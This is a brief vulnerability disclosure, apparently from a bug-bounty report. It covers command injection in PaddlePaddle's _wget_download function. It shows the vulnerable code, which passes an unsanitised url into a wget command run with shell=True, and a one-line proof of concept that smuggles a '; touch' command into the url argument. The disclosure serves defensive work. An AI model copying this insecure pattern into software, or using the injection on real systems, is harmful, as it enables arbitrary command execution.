## Vulnerability Code

### Command injection in paddle.utils.download._wget_download
>Command injection in paddle.utils.download._wget_download in paddlepaddle/paddle -> https://huntr.com/bounties/a569c64b-1e2b-4bed-a19f-47fd5a3da453/
```
def _wget_download(url, fullname):
    # using wget to download url
    tmp_fullname = fullname + "_tmp"
    # –user-agent
    command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'
    subprc = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
```
>poc
```
from paddle import utils
utils.download._wget_download("aa; touch codexecution", "bb")
```
